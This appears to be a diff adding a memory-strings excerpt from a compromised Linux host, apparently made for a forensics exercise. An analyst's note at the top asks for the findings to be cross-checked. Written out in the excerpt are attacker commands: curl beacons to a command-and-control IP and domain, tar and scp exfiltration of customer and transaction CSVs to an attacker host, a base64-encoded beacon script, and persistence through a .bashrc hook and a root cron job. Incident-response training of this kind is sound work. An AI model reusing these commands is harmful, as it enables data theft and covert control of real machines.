@@ -1,0 +1,79 @@
+================================================================
+HOST: 10.0.1.87 - memory strings excerpt
+Tool: strings -a memdump.raw | sed selected ranges
+Tunde: "Filter aggressively; 90% of this is junk, 10% is the
+kill chain. Cross-check anything you use against pslist, syslog,
+the SIEM CSV, or netflow before you write it as fact."
+================================================================
+
+SHELL=/bin/bash
+PWD=/home/o.adegoke
+LOGNAME=o.adegoke
+XDG_SESSION_ID=14
+_GRIOT=1
+HISTFILE=/home/o.adegoke/.bash_history
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+OLDPWD=/var/lib/mc
+TMPDIR=/tmp
+SSH_CONNECTION=185.220.101.9 51432 10.0.1.87 22
+
+curl -sfm 10 https://185.220.101.9/beacon -d workstation:root
+curl -sfm 10 https://gri0t-c2.dynamic-update.net/beacon -d host-87:root
+curl/7.81.0 OpenSSL/3.0.2 zlib/1.2.11
+scp /tmp/exfil.tgz attacker@185.220.101.9:/dropbox/
+tar czf /tmp/exfil.tgz /tmp/customers.csv /tmp/transactions.csv
+chmod +x /var/lib/mc/.helper
+/bin/bash -c chmod +x /var/lib/mc/.helper
+/home/o.adegoke/.bashrc
+/home/o.adegoke/.profile
+/home/o.adegoke/.config/autostart/update-check.desktop
+/var/lib/mc/.helper
+/etc/sudoers.d/90-ops
+/tmp/customers.csv
+/tmp/transactions.csv
+/tmp/exfil.tgz
+
+IyEvYmluL2Jhc2gKY3VybCAtc2ZtIDEwIGh0dHBzOi8vMTg1LjIyMC4xMDEuOS9iZWFjb24gLWQgd29ya3N0YXRpb246cm9vdAo=
+Z3JpMHQtYzIuZHluYW1pYy11cGRhdGUubmV0
+U0hBMjU2KHVwZGF0ZS1jaGVjayk9OTI2ZTY5Zjk0YmYx
+VGhpcyBjaHVuayBpcyBqdW5rIGZyb20gYSBicm93c2VyIGNhY2hl
+
+history -w
+sudo less /var/log/auth.log
+sudo less /etc/sudoers.d/90-ops
+echo 'source /var/lib/mc/.helper >/dev/null 2>&1 &' >> ~/.bashrc
+printf '*/3 * * * * root /var/lib/mc/.helper\n' > /etc/cron.d/.cache-update
+rm -f /etc/cron.d/.cache-update
+
+overlay
+br_netfilter
+nf_tables
+nft_chain_nat
+xfs
+snd_hda_intel
+vboxguest
+uvcvideo
+hid_generic
+cfg80211
+
+mozilla.sqlite
+sessionstore-backups
+gvfsd-fuse
+tracker-miner-fs-3
+pipewire-pulse
+update-notifier
+snapd-desktop-integration
+org.gnome.Nautilus
+recently-used.xbel
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+o.adegoke:x:1004:1004:Olu Adegoke:/home/o.adegoke:/bin/bash
+
+connect to 10.0.3.22 port 5432: Connection timed out
+GET /favicon.ico HTTP/1.1
+NTP sync complete
+resolved: query[A] updates.ubuntu.com
+DNS query[A] gri0t-c2.dynamic-update.net
+audit: EXECVE argc=3 a0="bash" a1="/var/lib/mc/.helper"
